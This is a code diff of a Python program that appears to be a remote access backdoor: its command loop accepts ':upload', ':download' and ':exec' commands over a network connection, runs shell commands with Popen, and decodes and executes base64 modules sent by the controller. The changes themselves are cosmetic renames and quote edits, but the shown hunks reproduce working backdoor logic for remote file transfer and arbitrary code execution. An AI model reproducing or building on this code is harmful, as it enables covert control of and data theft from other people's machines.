@@ -85,7 +85,7 @@ def save_file(filename):
         pass
 
 
-def cmd(command):
+def cmd_exec(command):
     proc = Popen(command,
               shell=True,
               stdout=PIPE,
@@ -143,7 +143,7 @@ def main():
                 )
         stdout, stderr = proc.communicate()
             
-        if cmd.startswith(':upload'):
+        if cmd.startswith(":upload"):
             getname = cmd.split(" ")
             rem_file = getname[1]
             filename = rem_file.replace("/","_")
@@ -156,7 +156,7 @@ def main():
             if not os.path.isfile(filename):
                 connection.send("[!] File upload failed! Please try again")
 
-        elif cmd.startswith(':download'):
+        elif cmd.startswith(":download"):
             getname = cmd.split(" ")
             loc_file = getname[1]
             if os.path.exists(loc_file) is True:
@@ -167,7 +167,7 @@ def main():
             else:
                 connection.send("[+] File not found!")
     
-        elif cmd.startswith(':exec'):
+        elif cmd.startswith(":exec"):
             getname = cmd.split(" ")        # split mod name from cmd
             modname = getname[1]            # Parse name of module we are retrieving. Will be used for logging and output purposes
     
@@ -179,7 +179,7 @@ def main():
             modexec = b64decode(mod_data)   # decode the received file
             module_handler(modexec, modname)            # send module to module_handler where it is executed and pipes data back to client
 
-        elif cmd == ":quit":
+        elif cmd == (":quit"):
             print("[!] Closing server!")
             connection.close()
             os._exit(0)
